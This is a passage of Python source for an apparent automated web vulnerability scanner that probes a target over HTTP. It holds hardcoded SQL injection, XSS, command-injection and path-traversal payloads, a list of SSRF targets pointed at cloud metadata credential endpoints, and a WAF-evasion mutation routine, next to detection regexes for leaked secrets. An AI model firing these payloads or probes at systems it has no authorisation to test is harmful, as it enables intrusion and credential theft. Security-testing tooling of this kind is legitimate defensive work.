"""
Quantara Intelligence Nodes v2 — 12 Specialized Scanning Engines
=================================================================
Real HTTP probing with evidence-based vulnerability detection.
Payloads sourced from PayloadsAllTheThings/.

Architecture:
    SwarmOrchestrator
        ├── PayloadLibrary   (loads PayloadsAllTheThings at startup)
        ├── HTTPProbe        (aiohttp-based probing with rate limiting)
        ├── ResponseAnalyzer (SQL/XSS/CMD/secrets detection patterns)
        │
        ├── Recon-X              (Surface Discovery Engine)
        ├── Payload-Gen          (Vector Synthesis Engine)
        ├── Exploit-Core         (Active Exploitation Engine)
        ├── Auth-Breach          (Credential Bypass Engine)
        ├── WAF-Evasion          (Traffic Obfuscation Engine)
        ├── Logic-Probe          (Business Logic Analysis Engine)
        ├── API-Guardian         (Endpoint Analysis Engine)
        ├── Cloud-Siphon         (Infrastructure Mapping Engine)
        ├── Data-Miner           (Sensitive Data Discovery Engine)
        ├── Fuzz-Master          (Input Perturbation Engine)
        ├── Anomaly-Detection    (Response Analysis Engine)
        └── Report-AI            (Intelligence Consolidation Engine)
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)

# ─── PayloadsAllTheThings base path ──────────────────────────────────────────
_PATT_BASE = Path(__file__).parent.parent / "PayloadsAllTheThings"


# ══════════════════════════════════════════════════════════════════════════════
# Payload Library — loads real payloads from PayloadsAllTheThings/
# ══════════════════════════════════════════════════════════════════════════════

class PayloadLibrary:
    """
    Lazy-loaded library sourced from PayloadsAllTheThings/.
    Provides categorized, deduplicated payload lists per attack class.
    """
    _loaded: bool = False
    _lock: asyncio.Lock = asyncio.Lock()

    sqli_fuzz:        List[str] = []
    sqli_auth_bypass: List[str] = []
    sqli_polyglots:   List[str] = []
    sqli_time_based:  List[str] = []

    xss_quick:     List[str] = []
    xss_polyglots: List[str] = []

    cmdi_unix:   List[str] = []
    cmdi_tokens: List[str] = []

    lfi_paths:   List[str] = []
    traversal:   List[str] = []

    # SSRF cloud metadata targets
    ssrf_cloud: List[str] = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://100.100.100.200/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/openstack/2012-08-10/meta_data.json",
        "http://localhost:6379/",
        "http://127.0.0.1:9200/",
        "http://127.0.0.1:27017/",
        "file:///etc/passwd",
        "file:///windows/win.ini",
        "dict://127.0.0.1:11211/",
    ]

    @classmethod
    def _read_txt(cls, path: Path, limit: int = 200) -> List[str]:
        if not path.exists():
            return []
        try:
            import html as html_mod
            lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()
            result = []
            for l in lines:
                l = l.strip()
                if not l or l.startswith("#"):
                    continue
                # Decode HTML entities that appear in some payload files
                l = html_mod.unescape(l)
                result.append(l)
                if len(result) >= limit:
                    break
            return result
        except Exception:
            return []

    @classmethod
    def _extract_code_blocks(cls, md_path: Path, limit: int = 50) -> List[str]:
        """Extract payloads from fenced code blocks in Markdown files."""
        if not md_path.exists():
            return []
        try:
            text = md_path.read_text(encoding="utf-8", errors="ignore")
            blocks = re.findall(r"```(?:html|javascript|sql|bash|sh)?\s*(.*?)```", text, re.DOTALL)
            payloads = []
            for blk in blocks:
                for ln in blk.splitlines():
                    ln = ln.strip()
                    if ln and not ln.startswith("#") and len(ln) < 300:
                        payloads.append(ln)
                if len(payloads) >= limit:
                    break
            return payloads[:limit]
        except Exception:
            return []

    @classmethod
    async def ensure_loaded(cls) -> None:
        if cls._loaded:
            return
        async with cls._lock:
            if cls._loaded:
                return
            cls._load_sync()
            cls._loaded = True

    @classmethod
    def _load_sync(cls) -> None:
        sql = _PATT_BASE / "SQL Injection" / "Intruder"
        cls.sqli_fuzz        = cls._read_txt(sql / "Generic_Fuzz.txt", 80)
        cls.sqli_auth_bypass = cls._read_txt(sql / "Auth_Bypass.txt", 80)
        cls.sqli_polyglots   = cls._read_txt(sql / "SQLi_Polyglots.txt", 40)
        cls.sqli_time_based  = cls._read_txt(sql / "Generic_TimeBased.txt", 30)

        xss = _PATT_BASE / "XSS Injection" / "Intruders"
        cls.xss_quick     = cls._read_txt(xss / "xss_payloads_quick.txt", 60)
        cls.xss_polyglots = cls._read_txt(xss / "XSS_Polyglots.txt", 40)

        cmd = _PATT_BASE / "Command Injection" / "Intruder"
        cls.cmdi_unix   = cls._read_txt(cmd / "command-execution-unix.txt", 50)
        cls.cmdi_tokens = cls._read_txt(cmd / "command_exec.txt", 50)

        trav = _PATT_BASE / "Directory Traversal" / "Intruder"
        cls.traversal = cls._read_txt(trav / "directory_traversal.txt", 60)
        cls.lfi_paths = cls._read_txt(trav / "deep_traversal.txt", 40)

        # Fallback hardcoded payloads if files are missing
        if not cls.sqli_fuzz:
            cls.sqli_fuzz = [
                "'", '"', "`", "1'", "1\"", "' OR '1'='1", "' OR 1=1--",
                "\" OR 1=1--", "' UNION SELECT NULL--", "1; DROP TABLE users--",
                "admin'--", "' OR SLEEP(5)#", "1; WAITFOR DELAY '0:0:5'--",
                "1' AND 1=1--", "1' AND 1=2--",
            ]
        if not cls.xss_quick:
            cls.xss_quick = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "'><script>alert(1)</script>",
                "<iframe onload=alert(1)>",
            ]
        if not cls.cmdi_unix:
            cls.cmdi_unix = [
                ";id", "|id", "||id", ";whoami", "|whoami", "$(id)", "`id`",
                ";cat /etc/passwd", ";ls -la", "& dir C:\\",
            ]

        total = (len(cls.sqli_fuzz) + len(cls.xss_quick) + len(cls.cmdi_unix)
                 + len(cls.traversal))
        logger.info(f"[PayloadLibrary] Loaded {total} payloads from PayloadsAllTheThings/")

    @classmethod
    def get_sqli(cls, limit: int = 25) -> List[str]:
        combined = cls.sqli_fuzz[:12] + cls.sqli_auth_bypass[:8] + cls.sqli_polyglots[:5]
        seen: set = set()
        out = []
        for p in combined:
            if p not in seen:
                seen.add(p)
                out.append(p)
            if len(out) >= limit:
                break
        return out

    @classmethod
    def get_xss(cls, limit: int = 20) -> List[str]:
        combined = cls.xss_quick[:12] + cls.xss_polyglots[:8]
        return list(dict.fromkeys(combined))[:limit]

    @classmethod
    def get_cmdi(cls, limit: int = 15) -> List[str]:
        combined = cls.cmdi_unix[:10] + cls.cmdi_tokens[:5]
        return list(dict.fromkeys(combined))[:limit]

    @classmethod
    def get_traversal(cls, limit: int = 15) -> List[str]:
        return cls.traversal[:limit] or [
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini", "%2e%2e%2fetc%2fpasswd",
        ]

    @classmethod
    def mutate(cls, payload: str) -> List[str]:
        """Generate WAF-bypass mutation variants of a payload."""
        variants = [payload]
        # URL encoding
        variants.append("".join(f"%{ord(c):02x}" if c in "'\"><" else c for c in payload))
        # Double URL encoding
        variants.append(payload.replace("<", "%253c").replace(">", "%253e")
                        .replace("'", "%2527").replace('"', "%2522"))
        # Comment-based SQLi obfuscation
        if "OR" in payload.upper():
            variants.append(payload.replace(" ", "/**/"))
        # Mixed case
        variants.append("".join(c.upper() if i % 2 == 0 else c.lower()
                                 for i, c in enumerate(payload)))
        # Null byte injection
        variants.append(payload + "%00")
        return list(dict.fromkeys(variants))[:6]


# ══════════════════════════════════════════════════════════════════════════════
# HTTP Probe — async HTTP client with rate limiting
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class ProbeResult:
    url: str
    status_code: int
    headers: Dict[str, str]
    body: str
    response_time: float  # seconds
    error: Optional[str] = None

    @property
    def ok(self) -> bool:
        return self.error is None

    @property
    def body_lower(self) -> str:
        return self.body.lower()

    @property
    def is_server_error(self) -> bool:
        return 500 <= self.status_code < 600


_PROBE_SENTINEL = ProbeResult(
    url="", status_code=0, headers={}, body="", response_time=0.0,
    error="not_executed"
)


class HTTPProbe:
    """
    Async HTTP prober built on aiohttp.
    Implements per-host rate limiting and safe defaults.
    """
    DEFAULT_HEADERS = {
        "User-Agent": (
            "Mozilla/5.0 (compatible; Quantara-SecurityScanner/2.0; "
            "+https://quantara.io/security)"
        ),
        "Accept": "text/html,application/json,*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
    }

    def __init__(self, connect_timeout: float = 5.0, read_timeout: float = 10.0,
                 max_rps: float = 5.0):
        self._connect_timeout = connect_timeout
        self._read_timeout = read_timeout
        self._min_interval = 1.0 / max_rps
        self._last_request: Dict[str, float] = {}
        self._session: Optional[Any] = None

    async def _get_session(self):
        if self._session is None or self._session.closed:
            try:
                import aiohttp
                connector = aiohttp.TCPConnector(
                    ssl=False, limit=20, ttl_dns_cache=300
                )
                timeout = aiohttp.ClientTimeout(
                    connect=self._connect_timeout, total=self._read_timeout + 5
                )
                self._session = aiohttp.ClientSession(
                    connector=connector, timeout=timeout
                )
            except ImportError:
                self._session = None
        return self._session

    async def _rate_limit(self, host: str) -> None:
        now = time.monotonic()
        last = self._last_request.get(host, 0.0)
        wait = self._min_interval - (now - last)
        if wait > 0:
            await asyncio.sleep(wait)
        self._last_request[host] = time.monotonic()

    async def get(self, url: str, params: Dict = None,
                  extra_headers: Dict = None) -> ProbeResult:
        return await self._request("GET", url, params=params,
                                   extra_headers=extra_headers)

    async def post(self, url: str, data: Dict = None, json_data: Dict = None,
                   extra_headers: Dict = None) -> ProbeResult:
        return await self._request("POST", url, data=data, json_data=json_data,
                                   extra_headers=extra_headers)

    async def _request(self, method: str, url: str, params: Dict = None,
                       data: Dict = None, json_data: Dict = None,
                       extra_headers: Dict = None) -> ProbeResult:
        parsed = urlparse(url)
        host = parsed.netloc or url
        await self._rate_limit(host)

        headers = {**self.DEFAULT_HEADERS, **(extra_headers or {})}
        t0 = time.monotonic()

        session = await self._get_session()
        if session is None:
            return ProbeResult(url=url, status_code=0, headers={}, body="",
                               response_time=0.0, error="aiohttp_unavailable")

        try:
            async with session.request(
                method, url, headers=headers, params=params,
                data=data, json=json_data, allow_redirects=True,
                max_redirects=3,
            ) as resp:
                elapsed = time.monotonic() - t0
                try:
                    body = await asyncio.wait_for(resp.text(errors="replace"), timeout=8.0)
                except (asyncio.TimeoutError, Exception):
                    body = ""
                return ProbeResult(
                    url=str(resp.url),
                    status_code=resp.status,
                    headers=dict(resp.headers),
                    body=body[:50_000],  # cap at 50 KB
                    response_time=elapsed,
                )
        except asyncio.TimeoutError:
            return ProbeResult(url=url, status_code=0, headers={}, body="",
                               response_time=time.monotonic() - t0,
                               error="timeout")
        except Exception as exc:
            return ProbeResult(url=url, status_code=0, headers={}, body="",
                               response_time=time.monotonic() - t0,
                               error=str(exc)[:120])

    async def close(self) -> None:
        if self._session and not self._session.closed:
            await self._session.close()


# ══════════════════════════════════════════════════════════════════════════════
# Response Analyzer — pattern-based vulnerability detection
# ══════════════════════════════════════════════════════════════════════════════

class ResponseAnalyzer:
    """Static methods for analyzing HTTP responses for vulnerability patterns."""

    # ── SQL Error Signatures ──────────────────────────────────────────────────
    _SQL_ERROR_PATTERNS: List[re.Pattern] = [p for p in (
        re.compile(r"SQL syntax.*MySQL", re.IGNORECASE),
        re.compile(r"Warning.*mysql_", re.IGNORECASE),
        re.compile(r"MySQLSyntaxErrorException", re.IGNORECASE),
        re.compile(r"valid MySQL result", re.IGNORECASE),
        re.compile(r"check the manual that corresponds to your MySQL", re.IGNORECASE),
        re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE),
        re.compile(r"org\.postgresql\.util\.PSQLException"),
        re.compile(r"PG::SyntaxError:", re.IGNORECASE),
        re.compile(r"Warning.*\Wpg_", re.IGNORECASE),
        re.compile(r"Driver.*SQL[\-\[]?Server", re.IGNORECASE),
        re.compile(r"OLE DB.*SQL Server", re.IGNORECASE),
        re.compile(r"ODBC SQL Server Driver", re.IGNORECASE),
        re.compile(r"SQLServer JDBC Driver", re.IGNORECASE),
        re.compile(r"SqlException", re.IGNORECASE),
        re.compile(r"Microsoft.*ODBC.*SQL", re.IGNORECASE),
        re.compile(r"Oracle error", re.IGNORECASE),
        re.compile(r"ORA-[0-9]{5}", re.IGNORECASE),
        re.compile(r"CLI Driver.*DB2", re.IGNORECASE),
        re.compile(r"DB2 SQL error", re.IGNORECASE),
        re.compile(r"SQLite.*syntax error", re.IGNORECASE),
        re.compile(r"SQLite3::DatabaseException", re.IGNORECASE),
        re.compile(r"Sybase message", re.IGNORECASE),
        re.compile(r"Unclosed quotation mark after the character string", re.IGNORECASE),
        re.compile(r"quoted string not properly terminated", re.IGNORECASE),
    )]

    # ── Command Injection Indicators ─────────────────────────────────────────
    _CMD_PATTERNS: List[re.Pattern] = [p for p in (
        re.compile(r"root:.*:0:0:", re.IGNORECASE),
        re.compile(r"uid=\d+\(\w+\)\s+gid=\d+"),
        re.compile(r"\b/bin/(sh|bash|zsh|dash)\b"),
        re.compile(r"Directory of C:\\"),
        re.compile(r"Volume in drive [A-Z] is"),
        re.compile(r"\binet addr:\d+\.\d+\.\d+\.\d+"),
        re.compile(r"\blo0?\s+Link encap"),
    )]

    # ── LFI / Path Traversal Indicators ─────────────────────────────────────
    _LFI_PATTERNS: List[re.Pattern] = [p for p in (
        re.compile(r"root:.*:0:0:.*:/bin/", re.IGNORECASE),
        re.compile(r"\[boot loader\]", re.IGNORECASE),
        re.compile(r"\[extensions\]", re.IGNORECASE),
        re.compile(r"; for 16-bit app support", re.IGNORECASE),
        re.compile(r"daemon:.*:/usr/sbin/nologin", re.IGNORECASE),
    )]

    # ── Sensitive Data Patterns ───────────────────────────────────────────────
    _SENSITIVE: Dict[str, re.Pattern] = {
        "AWS Access Key":    re.compile(r"AKIA[0-9A-Z]{16}"),
        "AWS Secret Key":    re.compile(r"(?i)aws[_-]?secret[_-]?access[_-]?key\s*[=:]\s*\S{20,}"),
        "JWT Token":         re.compile(r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}"),
        "Private Key":       re.compile(r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----"),
        "GitHub Token":      re.compile(r"ghp_[A-Za-z0-9]{36}"),
        "Slack Token":       re.compile(r"xox[bpars]-[0-9A-Za-z\-]{10,}"),
        "Google API Key":    re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
        "Stripe Secret Key": re.compile(r"sk_(live|test)_[0-9A-Za-z]{24,}"),
        "Password Field":    re.compile(r"(?i)[\"']?password[\"']?\s*:\s*[\"'][^\"']{6,}[\"']"),
        "DB Connection":     re.compile(r"(?i)(mongodb|mysql|postgresql|redis|mssql):\/\/[^\s\"<>]{6,}:[^\s\"<>@]{4,}@"),
        "Email Dump":        re.compile(r"[a-zA-Z0-9_.+-]{2,}@[a-zA-Z0-9-]+\.[a-zA-Z]{2,}"),
    }

    # ── Security Headers ─────────────────────────────────────────────────────
    REQUIRED_SECURITY_HEADERS = [
        "Strict-Transport-Security",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "Content-Security-Policy",
        "Referrer-Policy",
    ]

    # ── WAF Signatures in responses ──────────────────────────────────────────
    _WAF_SIGNATURES: Dict[str, List[str]] = {
        "Cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
        "AWS WAF":    ["aws", "x-amzn-requestid", "x-amzn-trace-id"],
        "ModSecurity": ["mod_security", "modsecurity", "NOYB"],
        "Imperva":    ["imperva", "incapsula", "_incap_ses"],
        "Akamai":     ["akamai", "x-akamai"],
        "F5 BIG-IP":  ["bigip", "bigipserver", "x-wa-info"],
    }

    # ── Technology Fingerprints ───────────────────────────────────────────────
    _TECH_HEADERS = {
        "Server":            "server",
        "X-Powered-By":      "x-powered-by",
        "X-Generator":       "x-generator",
        "X-Framework":       "x-framework",
        "X-AspNet-Version":  "x-aspnet-version",
        "X-Runtime":         "x-runtime",
    }

    @classmethod
    def has_sql_error(cls, body: str) -> Tuple[bool, str]:
        for pat in cls._SQL_ERROR_PATTERNS:
            m = pat.search(body)
            if m:
                return True, m.group(0)[:120]
        return False, ""

    @classmethod
    def has_cmd_output(cls, body: str) -> Tuple[bool, str]:
        for pat in cls._CMD_PATTERNS:
            m = pat.search(body)
            if m:
                return True, m.group(0)[:120]
        return False, ""

    @classmethod
    def has_lfi_content(cls, body: str) -> Tuple[bool, str]:
        for pat in cls._LFI_PATTERNS:
            m = pat.search(body)
            if m:
                return True, m.group(0)[:120]
        return False, ""

    @classmethod
    def has_reflection(cls, body: str, payload: str) -> bool:
        """Check if payload or key part of it appears unencoded in response."""
        if len(payload) < 4:
            return False
        # Check for dangerous tokens in response
        tokens = ["<script", "onerror=", "onload=", "javascript:", "alert("]
        for tok in tokens:
            if tok in payload.lower() and tok in body.lower():
                return True
        # General: does the payload appear verbatim?
        return payload[:40] in body

    @classmethod
    def find_sensitive_data(cls, body: str) -> Dict[str, str]:
        results: Dict[str, str] = {}
        for name, pat in cls._SENSITIVE.items():
            m = pat.search(body)
            if m:
                matched = m.group(0)
                # Redact partially for safety logging
                if len(matched) > 16:
                    matched = matched[:8] + "****" + matched[-4:]
                results[name] = matched
        return results

    @classmethod
    def get_missing_security_headers(cls, headers: Dict) -> List[str]:
        h_lower = {k.lower(): v for k, v in headers.items()}
        return [
            h for h in cls.REQUIRED_SECURITY_HEADERS
            if h.lower() not in h_lower
        ]

    @classmethod
    def get_server_tech(cls, headers: Dict) -> List[str]:
        tech = []
        h_lower = {k.lower(): v for k, v in headers.items()}
        for hdr in cls._TECH_HEADERS.values():
            val = h_lower.get(hdr, "")
            if val:
                tech.append(f"{hdr}: {val}")
        return tech

    @classmethod
    def detect_waf(cls, headers: Dict, body: str) -> Optional[str]:
        h_str = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
        for waf, sigs in cls._WAF_SIGNATURES.items():
            if any(s in h_str or s in body.lower() for s in sigs):
                return waf
        return None

    @classmethod
    def has_cors_issue(cls, headers: Dict) -> Tuple[bool, str]:
        acao = headers.get("Access-Control-Allow-Origin", "")
        if acao == "*":
            return True, "ACAO: * (wildcard — allows any origin)"
        acac = headers.get("Access-Control-Allow-Credentials", "")
        if acac.lower() == "true" and acao not in ("", "*"):
            return True, f"ACAO: {acao} with ACAC: true — potential credential leakage"
        return False, ""

    @classmethod
    def is_timing_anomaly(cls, baseline_time: float, probed_time: float,
                          threshold_factor: float = 3.0) -> bool:
        if baseline_time <= 0:
            return False
        return probed_time >= baseline_time * threshold_factor and probed_time > 3.0

    @classmethod
    def body_length_delta(cls, baseline_len: int, probed_len: int) -> float:
        if baseline_len == 0:
            return 0.0
        return abs(probed_len - baseline_len) / baseline_len


# ══════════════════════════════════════════════════════════════════════════════
# Telemetry Event Types
# ══════════════════════════════════════════════════════════════════════════════

class NodeEvent(str, Enum):
    NODE_STARTED          = "node_started"
    NODE_COMPLETED        = "node_completed"
    NODE_ERROR            = "node_error"
    ENDPOINT_DISCOVERED   = "endpoint_discovered"
    SUBDOMAIN_FOUND       = "subdomain_found"
    ASSET_DETECTED        = "asset_detected"
    PAYLOAD_GENERATED     = "payload_generated"
    ATTACK_ATTEMPTED      = "attack_attempted"
    VULNERABILITY_DETECTED = "vulnerability_detected"
    SCAN_STAGE_COMPLETED  = "scan_stage_completed"
    WAF_BYPASS_ATTEMPTED  = "waf_bypass_attempted"
    AUTH_TEST_EXECUTED    = "auth_test_executed"
    DATA_EXPOSURE_FOUND   = "data_exposure_found"
    FUZZ_ITERATION        = "fuzz_iteration"
    ANOMALY_DETECTED      = "anomaly_detected"
    REPORT_GENERATED      = "report_generated"
    SWARM_INITIALIZED     = "swarm_initialized"
    SWARM_COMPLETED       = "swarm_completed"
    CLOUD_SCAN_EVENT      = "cloud_scan_event"
    LOGIC_ANALYSIS_EVENT  = "logic_analysis_event"
    TECH_FINGERPRINT      = "tech_fingerprint"
    SECURITY_HEADER       = "security_header"
    SENSITIVE_DATA_FOUND  = "sensitive_data_found"


# ══════════════════════════════════════════════════════════════════════════════
# Finding Dataclass
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class NodeFinding:
    id:              str   = field(default_factory=lambda: str(uuid.uuid4()))
    node_name:       str   = ""
    title:           str   = ""
    description:     str   = ""
    severity:        str   = "info"
    endpoint:        str   = ""
    confidence:      float = 0.0
    cwe:             str   = ""
    owasp:           str   = ""
    category:        str   = ""
    evidence:        Dict  = field(default_factory=dict)
    remediation:     str   = ""
    exploit_payload: str   = ""
    matched_content: str   = ""
    timestamp:       str   = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

    def to_dict(self) -> Dict:
        return {
            "id":              self.id,
            "node_name":       self.node_name,
            "module_name":     self.node_name,
            "module":          self.node_name,
            "title":           self.title,
            "description":     self.description,
            "severity":        self.severity,
            "endpoint":        self.endpoint,
            "file":            self.endpoint,
            "confidence":      self.confidence,
            "cwe":             self.cwe,
            "owasp":           self.owasp,
            "category":        self.category,
            "evidence":        self.evidence,
            "remediation":     self.remediation,
            "exploit_payload": self.exploit_payload,
            "matched_content": self.matched_content,
            "timestamp":       self.timestamp,
            "tags":            [self.node_name, self.category],
            "line_number":     0,
        }


# ══════════════════════════════════════════════════════════════════════════════
# Swarm Telemetry Emitter
# ══════════════════════════════════════════════════════════════════════════════

class SwarmTelemetryEmitter:
    """Central telemetry collector and pub/sub broadcaster for the swarm."""

    def __init__(self):
        self._events:              List[Dict[str, Any]] = []
        self._findings:            List[Dict[str, Any]] = []
        self._queues:              List[asyncio.Queue]  = []
        self._attack_graph_nodes:  List[Dict]           = []
        self._attack_graph_edges:  List[Dict]           = []
        self._max_events = 5000
        self._scan_id: str = ""
        self._graph_update_counter: int = 0

    def subscribe(self) -> asyncio.Queue:
        q: asyncio.Queue = asyncio.Queue(maxsize=500)
        self._queues.append(q)
        return q

    def unsubscribe(self, q: asyncio.Queue) -> None:
        try:
            self._queues.remove(q)
        except ValueError:
            pass

    async def emit(self, event_type: str, data: Dict[str, Any], scan_id: str = "") -> None:
        payload = {
            "event":     event_type,
            "scan_id":   scan_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data":      data,
        }
        self._events.append(payload)
        if len(self._events) > self._max_events:
            self._events = self._events[-self._max_events:]

        dead = []
        for q in list(self._queues):
            try:
                q.put_nowait(payload)
            except asyncio.QueueFull:
                dead.append(q)
        for q in dead:
            self.unsubscribe(q)

    def add_finding(self, finding: Dict) -> None:
        self._findings.append(finding)

    def add_graph_node(self, node: Dict, scan_id: str = "") -> None:
        for existing in self._attack_graph_nodes:
            if existing.get("id") == node.get("id"):
                existing.update(node)
                self._push_graph_update(scan_id or self._scan_id)
                return
        self._attack_graph_nodes.append(node)
        self._push_graph_update(scan_id or self._scan_id)

    def add_graph_edge(self, edge: Dict, scan_id: str = "") -> None:
        for existing in self._attack_graph_edges:
            if (existing.get("source") == edge.get("source") and
                    existing.get("target") == edge.get("target")):
                existing.update(edge)
                self._push_graph_update(scan_id or self._scan_id)
                return
        self._attack_graph_edges.append(edge)
        self._push_graph_update(scan_id or self._scan_id)

    def _push_graph_update(self, scan_id: str) -> None:
        """Push a graph_update event every 3 graph mutations (throttled)."""
        self._graph_update_counter += 1
        if self._graph_update_counter % 3 != 0:
            return
        payload = {
            "event":     "graph_update",
            "scan_id":   scan_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data": {
                "nodes": list(self._attack_graph_nodes),
                "edges": list(self._attack_graph_edges),
            },
        }
        self._events.append(payload)
        dead = []
        for q in list(self._queues):
            try:
                q.put_nowait(payload)
            except asyncio.QueueFull:
                dead.append(q)
        for q in dead:
            self.unsubscribe(q)

    def get_events(self, limit: int = 200) -> List[Dict[str, Any]]:
        return self._events[-limit:]

    def get_findings(self) -> List[Dict]:
        return self._findings

    def get_attack_graph(self) -> Dict:
        return {
            "nodes": self._attack_graph_nodes,
            "edges": self._attack_graph_edges,
        }

    def reset(self, scan_id: str = "") -> None:
        self._events.clear()
        self._findings.clear()
        self._scan_id = scan_id
        self._graph_update_counter = 0
        self._attack_graph_nodes.clear()
        self._attack_graph_edges.clear()

    async def sse_generator(self, scan_id: Optional[str] = None,
                             keepalive_seconds: float = 15.0):
        q = self.subscribe()
        try:
            while True:
                try:
                    event = await asyncio.wait_for(q.get(), timeout=keepalive_seconds)
                    if scan_id and event.get("scan_id") != scan_id:
                        continue
                    yield f"data: {json.dumps(event)}\n\n"
                except asyncio.TimeoutError:
                    yield ": keepalive\n\n"
        except asyncio.CancelledError:
            pass
        finally:
            self.unsubscribe(q)


# ══════════════════════════════════════════════════════════════════════════════
# Base Intelligence Node
# ══════════════════════════════════════════════════════════════════════════════

class IntelligenceNode:
    """Base class for all intelligence nodes."""

    def __init__(self, name: str, role: str, emitter: SwarmTelemetryEmitter):
        self.name    = name
        self.role    = role
        self.emitter = emitter
        self.probe   = HTTPProbe(connect_timeout=5.0, read_timeout=10.0, max_rps=4.0)
        self.findings: List[NodeFinding] = []
        self.is_active  = False
        self.start_time = 0.0

    async def execute(self, target: str, scan_id: str,
                      context: Optional[Dict[str, Any]] = None) -> List[NodeFinding]:
        self.is_active  = True
        self.start_time = time.time()
        context = context or {}
        await PayloadLibrary.ensure_loaded()

        await self.emitter.emit(NodeEvent.NODE_STARTED, {
            "node":   self.name,
            "role":   self.role,
            "target": target,
        }, scan_id)

        try:
            findings = await self._run(target, scan_id, context)
            self.findings.extend(findings)
            elapsed = round(float(time.time() - self.start_time), 2)
            await self.emitter.emit(NodeEvent.NODE_COMPLETED, {
                "node":            self.name,
                "role":            self.role,
                "findings_count":  len(findings),
                "elapsed_seconds": elapsed,
            }, scan_id)
            return findings
        except Exception as e:
            await self.emitter.emit(NodeEvent.NODE_ERROR, {
                "node":  self.name,
                "error": str(e),
            }, scan_id)
            logger.error(f"[{self.name}] Error: {e}", exc_info=True)
            return []
        finally:
            self.is_active = False

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        raise NotImplementedError

    async def _make_finding(self, scan_id: str = "", **kwargs) -> NodeFinding:
        f = NodeFinding(node_name=self.name, **kwargs)
        d = f.to_dict()
        self.emitter.add_finding(d)
        await self.emitter.emit(NodeEvent.VULNERABILITY_DETECTED, d, scan_id)
        return f

    def _add_vuln_graph_node(self, vuln_id: str, label: str,
                              severity: str, endpoint: str) -> None:
        self.emitter.add_graph_node({
            "id":     vuln_id,
            "label":  label,
            "type":   "vulnerability",
            "risk":   severity,
            "status": "compromised",
        })
        ep_id = "ep-" + endpoint.split("?")[0].replace("/", "-").strip("-")[:40]
        self.emitter.add_graph_edge({
            "source": ep_id,
            "target": vuln_id,
            "type":   "exploit",
            "active": True,
        })


# ══════════════════════════════════════════════════════════════════════════════
# 1. Recon-X — Surface Discovery Engine
# ══════════════════════════════════════════════════════════════════════════════

class ReconXNode(IntelligenceNode):
    """Discover and map the external attack surface via real HTTP probing."""

    # High-value paths to probe
    SENSITIVE_PATHS = [
        "/.env", "/.env.local", "/.env.production",
        "/.git/HEAD", "/.git/config",
        "/config.php", "/wp-config.php", "/configuration.php",
        "/debug", "/debug.php", "/phpinfo.php",
        "/admin", "/admin/", "/admin/dashboard",
        "/swagger.json", "/openapi.json", "/api-docs",
        "/graphql", "/graphiql",
        "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
        "/api/v1/users", "/api/v1/admin", "/api/health",
        "/server-status", "/server-info",
    ]

    SUBDOMAIN_PREFIXES = [
        "api", "dev", "staging", "admin", "portal", "cdn",
        "mail", "vpn", "test", "beta", "app", "auth",
        "dashboard", "ws", "graphql", "docs", "internal",
    ]

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("Recon-X", "Surface Discovery Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        findings: List[NodeFinding] = []
        parsed = urlparse(target)
        base   = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else target
        domain = parsed.hostname or target

        # ── Subdomain enumeration (announce, no HTTP probe to avoid DNS issues)
        for prefix in self.SUBDOMAIN_PREFIXES:
            sub = f"{prefix}.{domain}"
            await asyncio.sleep(0.03)
            await self.emitter.emit(NodeEvent.SUBDOMAIN_FOUND, {
                "node":     self.name,
                "subdomain": sub,
                "message":  f"Enumerating subdomain: {sub}",
            }, scan_id)
            self.emitter.add_graph_node({
                "id":    f"sub-{prefix}",
                "label": sub,
                "type":  "asset",
                "risk":  "low",
                "status": "identified",
            })
            self.emitter.add_graph_edge({
                "source": "target-root",
                "target": f"sub-{prefix}",
                "type":   "recon",
                "active": True,
            })

        # ── Root target node in graph
        self.emitter.add_graph_node({
            "id":     "target-root",
            "label":  domain,
            "type":   "asset",
            "risk":   "medium",
            "status": "scanning",
        })

        # ── Active endpoint probing
        discovered_endpoints: List[str] = []
        tech_disclosed: List[str] = []

        for path in self.SENSITIVE_PATHS:
            url = urljoin(base + "/", path.lstrip("/"))
            await asyncio.sleep(0.04)

            result = await self.probe.get(url)

            ep_id = "ep-" + path.replace("/", "-").strip("-")[:40]
            risk = "high" if any(k in path for k in [".env", ".git", "config", "phpinfo", "actuator"]) else "medium" if "admin" in path else "low"

            if result.ok and result.status_code in (200, 201, 301, 302, 401, 403):
                discovered_endpoints.append(url)

                # Tech fingerprinting from headers
                tech = ResponseAnalyzer.get_server_tech(result.headers)
                if tech:
                    tech_disclosed.extend(tech)
                    await self.emitter.emit(NodeEvent.TECH_FINGERPRINT, {
                        "node":    self.name,
                        "tech":    tech,
                        "message": f"Technology disclosed via {path}: {', '.join(tech[:3])}",
